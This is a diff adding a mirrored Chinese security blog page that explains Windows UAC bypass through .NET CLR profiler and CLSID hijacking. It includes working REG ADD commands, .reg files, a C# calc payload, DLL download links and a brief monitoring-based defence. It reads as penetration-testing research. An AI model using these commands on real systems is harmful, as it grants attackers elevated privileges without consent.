@@ -1,0 +1,907 @@
+
+
+<script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"></script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+	<script src="http://echarts.baidu.com/dist/echarts.common.min.js"></script>
+	<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+    </style>
+
+
+    
+
+    <title>Use CLR to bypass UAC | </title>
+    <meta name="author" content="wiki">
+    
+    <meta name="description" content="0x00 前言
+在之前的文章《Use CLR to maintain persistence》介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。那么，如果劫持了高权限的.Net程序，就能够绕过UAC，比如gpedit.msc
+最近我在clem@clavoill">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="Use CLR to bypass UAC"/>
+    <meta property="og:site_name" content="wiki"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="wiki" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/lastest.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+</head>
+
+<style>
+
+</style>
+<body style="background-color:#2196f3">
+
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.15.0/TweenMax.min.js"></script>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo darken-1">
+    
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">wiki</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-2" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://p4gdp8beq.bkt.clouddn.com/timgsi1.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">wiki</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-2" id="category-menu">
+    
+
+            
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+<div class="container main-container">
+    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo darken-2">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+	<!-- 添加渲染 -->
+	<div id="toc" class="toc-article">
+		<strong class="toc-title"></strong>
+	</div> 
+        <div class="card-content">
+		  
+			
+            
+
+            <div class="article-title">
+                
+    
+        <h1>Use CLR to bypass UAC</h1>
+    
+
+
+            </div>
+            <time class="red-link-context" datetime="2018-05-25T13:03:44.875Z"><a href="">2018-05-25</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+
+            <div class="toc red-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x00-前言"><span class="section table-of-contents-text">0x00 前言</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x01-简介"><span class="section table-of-contents-text">0x01 简介</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-使用CLR绕过UAC"><span class="section table-of-contents-text">0x02 使用CLR绕过UAC</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x03-劫持系统CLSID绕过UAC的方法"><span class="section table-of-contents-text">0x03 劫持系统CLSID绕过UAC的方法</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、-B29D466A-857D-35BA-8712-A758861BFEA1"><span class="section table-of-contents-text">1、{B29D466A-857D-35BA-8712-A758861BFEA1}</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、-D5AB5662-131D-453D-88C8-9BBA87502ADE"><span class="section table-of-contents-text">2、{D5AB5662-131D-453D-88C8-9BBA87502ADE}</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#3、-0A29FF9E-7F9C-4437-8B11-F424491E3931"><span class="section table-of-contents-text">3、{0A29FF9E-7F9C-4437-8B11-F424491E3931}</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#4、-CB2F6723-AB3A-11D2-9C40-00C04FA30A3E"><span class="section table-of-contents-text">4、{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-补充"><span class="section table-of-contents-text">0x04 补充</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x05-防御"><span class="section table-of-contents-text">0x05 防御</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x06-小结"><span class="section table-of-contents-text">0x06 小结</span></a></li></ol>
+</div>
+
+
+            <div class="entry red-link-context">
+                <script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr>
+<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/" target="_blank" rel="noopener">《Use CLR to maintain persistence》</a>介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。那么，如果劫持了高权限的.Net程序，就能够绕过UAC，比如gpedit.msc</p>
+<p>最近我在clem@clavoillotte的博客上也看到了相同的利用思路，并且，他的博客里有更多值得学习的地方。于是，我对他博客介绍的内容进行了整理，结合自己的经验，适当作补充，分享给大家。</p>
+<p>clem@clavoillotte的博客地址：</p>
+<p><a href="https://offsec.provadys.com/UAC-bypass-dotnet.html" target="_blank" rel="noopener">https://offsec.provadys.com/UAC-bypass-dotnet.html</a></p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr>
+<p>本文将要介绍以下内容：</p>
+<ul>
+<li>使用CLR绕过UAC的方法</li>
+<li>劫持系统CLSID绕过UAC的方法</li>
+</ul>
+<h2 id="0x02-使用CLR绕过UAC"><a href="#0x02-使用CLR绕过UAC" class="headerlink" title="0x02 使用CLR绕过UAC"></a>0x02 使用CLR绕过UAC</h2><hr>
+<p>我在<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/" target="_blank" rel="noopener">《Use CLR to maintain persistence》</a>一文中使用了wmic修改环境变量，代码如下：</p>
+<pre><code>wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot;
+wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;{11111111-1111-1111-1111-111111111111}&quot;
+</code></pre><p>在<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/" target="_blank" rel="noopener">《Use Logon Scripts to maintain persistence》</a>补充了使用powershell修改环境变量的方法，代码如下：</p>
+<pre><code>New-ItemProperty &quot;HKCU:\Environment\&quot; COR_ENABLE_PROFILING -value &quot;1&quot; -propertyType string | Out-Null
+New-ItemProperty &quot;HKCU:\Environment\&quot; COR_PROFILER -value &quot;{11111111-1111-1111-1111-111111111111}&quot; -propertyType string | Out-Null
+</code></pre><p>clem@clavoillotte的方法是直接通过reg add，代码如下：</p>
+<pre><code>REG ADD &quot;HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f
+REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}&quot; /f
+</code></pre><p>clem@clavoillotte的POC:</p>
+<pre><code>REG ADD &quot;HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f
+REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}&quot; /f
+REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f
+REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f
+mmc gpedit.msc
+</code></pre><p>个人认为不需要指定环境变量COR_PROFILER_PATH，经过精简后的POC如下：</p>
+<pre><code>REG ADD &quot;HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\test\calc.dll&quot; /f
+REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}&quot; /f
+REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f
+mmc gpedit.msc
+</code></pre><p>测试dll依旧是通过c++编写的dll标准模板，下载地址：</p>
+<p><a href="https://raw.githubusercontent.com/3gstudent/test/master/calc.dll" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/test/master/calc.dll</a></p>
+<p>会正常启动gpedit.msc，同时弹出计算器，权限为high</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/3-1.png" alt="Alt text"></p>
+<p>如果想只启动计算器，不执行gpedit.msc，在启动代码<code>WinExec(&quot;calc.exe&quot;,SW_SHOWNORMAL);</code>后添加<code>ExitProcess(0);</code>就好</p>
+<p>编译好的dll已上传，下载地址如下：</p>
+<p><a href="https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll</a></p>
+<p>测试如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/3-2.png" alt="Alt text"></p>
+<p>计算器权限为high，成功绕过UAC</p>
+<h2 id="0x03-劫持系统CLSID绕过UAC的方法"><a href="#0x03-劫持系统CLSID绕过UAC的方法" class="headerlink" title="0x03 劫持系统CLSID绕过UAC的方法"></a>0x03 劫持系统CLSID绕过UAC的方法</h2><hr>
+<p>clem@clavoillotte在博客中分享了如何劫持系统CLSID实现UAC绕过，所以接下来对其逐个测试，并标记需要注意的地方</p>
+<h3 id="1、-B29D466A-857D-35BA-8712-A758861BFEA1"><a href="#1、-B29D466A-857D-35BA-8712-A758861BFEA1" class="headerlink" title="1、{B29D466A-857D-35BA-8712-A758861BFEA1}"></a>1、{B29D466A-857D-35BA-8712-A758861BFEA1}</h3><p>注册表文件如下：</p>
+<pre><code>Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}]
+@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\Implemented Categories]
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\Implemented Categories\{62C8FE65-4EBB-45E7-B440-6E39B2CDBF29}]
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32]
+@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;
+&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;
+&quot;Class&quot;=&quot;TestDotNet.Class1&quot;
+&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;
+&quot;ThreadingModel&quot;=&quot;Both&quot;
+&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32\10.0.0.0]
+&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;
+&quot;Class&quot;=&quot;TestDotNet.Class1&quot;
+&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;
+&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\ProgId]
+@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;
+</code></pre><p><strong>注：</strong></p>
+<p>注册表项中的<code>@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</code>表明，执行gpedit.msc时会调用该CLSID</p>
+<p>生成test_managed.dll的c#代码如下：</p>
+<pre><code>using System;
+using System.Diagnostics;
+
+namespace TestDotNet
+{
+   public class Class1
+   {
+      static Class1()
+      { 
+         Process.Start(&quot;calc.exe&quot;);
+         Environment.Exit(0);
+      }
+   }
+}
+</code></pre><p>保存为<code>TestDotNet.cs</code>，编译成dll</p>
+<p>使用csc.exe编译生成dll：</p>
+<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library TestDotNet.cs
+</code></pre><p><strong>注：</strong></p>
+<p>使用.Net 4.0目录下的csc.exe</p>
+<p>将生成的TestDotNet.dll重命名为test_managed.dll，成功绕过UAC，测试如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-4.png" alt="Alt text"></p>
+<p><strong>补充关于c#编译文件的一个技巧：</strong></p>
+<p>使用Visual Studio编译c#程序，如果项目名称同程序集名称(即命名空间namespace)不对应（结合本文，代码中程序集名称为TestDotNet，而新建的项目名却是Class1），需要重新指定程序集名称，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-2.png" alt="Alt text"></p>
+<p>同样，使用csc.exe编译生成文件也存在这个问题</p>
+<p>例如将源代码保存为a.cs，那么在输出的时候必须加/out参数指定输出文件为TestDotNet.dll，这样程序集名称也默认为TestDotNet（同源代码对应），具体参数如下：</p>
+<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library /out:TestDotNet.dll a.cs
+</code></pre><p>否则，dll虽然能够被加载，但无法执行，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-3.png" alt="Alt text"></p>
+<h3 id="2、-D5AB5662-131D-453D-88C8-9BBA87502ADE"><a href="#2、-D5AB5662-131D-453D-88C8-9BBA87502ADE" class="headerlink" title="2、{D5AB5662-131D-453D-88C8-9BBA87502ADE}"></a>2、{D5AB5662-131D-453D-88C8-9BBA87502ADE}</h3><p>注册表文件如下：</p>
+<pre><code>Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}]
+@=&quot;Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\Implemented Categories]
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\Implemented Categories\{62C8FE65-4EBB-45e7-B440-6E39B2CDBF29}]
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\InprocServer32]
+@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;
+&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;
+&quot;Class&quot;=&quot;TestDotNet.Class1&quot;
+&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;
+&quot;ThreadingModel&quot;=&quot;Both&quot;
+&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\InprocServer32\3.0.0.0]
+&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;
+&quot;Class&quot;=&quot;TestDotNet.Class1&quot;
+&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;
+&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;
+</code></pre><p><strong>注：</strong></p>
+<p>注册表项中的<code>@=&quot;Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory&quot;</code>，以下命令执行时会调用该CLSID：</p>
+<ul>
+<li>compmgmt.msc</li>
+<li>eventvwr.msc</li>
+<li>secpol.msc</li>
+<li>taskschd.msc</li>
+</ul>
+<p>使用csc.exe编译dll：</p>
+<pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /t:library TestDotNet.cs
+</code></pre><p><strong>注：</strong></p>
+<p>dll要使用.net 2.0编译</p>
+<h3 id="3、-0A29FF9E-7F9C-4437-8B11-F424491E3931"><a href="#3、-0A29FF9E-7F9C-4437-8B11-F424491E3931" class="headerlink" title="3、{0A29FF9E-7F9C-4437-8B11-F424491E3931}"></a>3、{0A29FF9E-7F9C-4437-8B11-F424491E3931}</h3><p>注册表文件如下：</p>
+<pre><code>Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}]
+@=&quot;NDP SymBinder&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32]
+@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;
+&quot;ThreadingModel&quot;=&quot;Both&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32\4.0.30319]
+@=&quot;4.0.30319&quot;
+&quot;ImplementedInThisVersion&quot;=&quot;&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ProgID]
+@=&quot;CorSymBinder_SxS&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server]
+@=&quot;C:\\Temp\\test_unmanaged.dll&quot;
+</code></pre><p>测试系统为Win7和Win10，未成功，所以我对该脚本作了修改，修改后的文件如下：</p>
+<pre><code>Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}]
+@=&quot;NDP SymBinder&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32]
+@=&quot;C:\\Temp\\test_unmanaged.dll&quot;
+&quot;ThreadingModel&quot;=&quot;Both&quot;
+</code></pre><p>此处的test_unmanaged.dll同1和2的不同，这里需要一个标准dll，实现dll劫持，dll下载地址;</p>
+<p><a href="https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll</a></p>
+<p>执行以下代码均能触发dll劫持，实现UAC绕过：</p>
+<pre><code>C:\Windows\System32\eventvwr.exe
+</code></pre><p>or</p>
+<pre><code>C:\Windows\System32\mmc.exe CompMgmt.msc
+</code></pre><p><strong>注：</strong></p>
+<p>该利用方法b33f@FuzzySecurity在DefCon25也介绍过，详情可见如下链接：</p>
+<p><a href="https://raw.githubusercontent.com/FuzzySecurity/DefCon25/master/Lab-Writeup.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/FuzzySecurity/DefCon25/master/Lab-Writeup.txt</a></p>
+<h3 id="4、-CB2F6723-AB3A-11D2-9C40-00C04FA30A3E"><a href="#4、-CB2F6723-AB3A-11D2-9C40-00C04FA30A3E" class="headerlink" title="4、{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}"></a>4、{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}</h3><p>注册表文件如下：</p>
+<pre><code>Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}]
+@=&quot;Microsoft Common Language Runtime Meta Data&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\InprocServer32]
+@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;
+&quot;ThreadingModel&quot;=&quot;Both&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\InprocServer32\4.0.30319]
+@=&quot;4.0.30319&quot;
+&quot;ImplementedInThisVersion&quot;=&quot;&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\ProgID]
+@=&quot;CLRMetaData.CorRuntimeHost.2&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\Server]
+@=&quot;..\\..\\..\\..\\Temp\\test_unmanaged.dll&quot;
+</code></pre><p>此处的test_unmanaged.dll同1和2的不同，这里需要一个标准dll，实现dll劫持，dll下载地址;</p>
+<p><a href="https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll</a></p>
+<p>执行secpol.msc触发dll劫持，测试如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/5-2.png" alt="Alt text"></p>
+<h2 id="0x04-补充"><a href="#0x04-补充" class="headerlink" title="0x04 补充"></a>0x04 补充</h2><p>使用Procmon记录gpedit.msc的启动过程，寻找可被利用的系统CLSID，寻找特征如下：</p>
+<p>打开注册表键值<code>HKCU:\Software\Classes\CLSID\{****}\InprocServer32</code>，返回<code>NAME NOT FOUND</code></p>
+<p>打开注册表键值<code>HKCR:\CLSID\{****}\InprocServer32</code>，返回<code>SUCCESS</code></p>
+<p>如下图，标记的几个CLSID符合要求</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-1.png" alt="Alt text"></p>
+<p>在测试系统Win7 x86下共找到如下符合要求的CLSID：</p>
+<ul>
+<li>{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}</li>
+<li>{B708457E-DB61-4C55-A92F-0D4B5E9B1224}</li>
+<li>{871C5380-42A0-1069-A2EA-08002B30309D}</li>
+<li>{D02B1F72-3407-48ae-BA88-E8213C6761F1}</li>
+<li>{B29D466A-857D-35BA-8712-A758861BFEA1}</li>
+<li>{D02B1F73-3407-48AE-BA88-E8213C6761F1}</li>
+<li>{B0395DA5-6A15-4E44-9F36-9A9DC7A2F341}</li>
+<li>{ADE6444B-C91F-4E37-92A4-5BB430A33340}</li>
+</ul>
+<h2 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h2><hr>
+<p>监控注册表<code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code>下键值的创建和修改</p>
+<h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr>
+<p>微软不把UAC绕过作为漏洞，站在他们的角度可以理解。但在渗透测试中，常常会碰到需要绕过UAC的情况，某些UAC绕过方法往往还能作更多利用。站在防御的角度，提醒防御方对UAC绕过方法保持关注。</p>
+<hr>
+<p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>
+
+                
+<p class="red-link-context">
+    <a href="775f3b11.html" rel="next" title="域渗透——利用SYSVOL还原组策略中保存的密码">
+    上一篇：域渗透——利用SYSVOL还原组策略中保存的密码
+  </a>
+</p>
+
+
+
+<p class="red-link-context">
+    <a href="ce4fb900.html" rel="next" title="域渗透——利用DCOM在远程系统执行程序">
+    下一篇：域渗透——利用DCOM在远程系统执行程序
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+	
+</article>
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style_32x32">
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_tqq"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a href="http://www.jiathis.com/share?uid=2157721" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jia.js?uid=2157721" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!-- ������City�氲װ���� -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zNDIxOS8xMDc1Nw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> Ϊ����ʹ�����������۹����뼤��JavaScript</noscript>
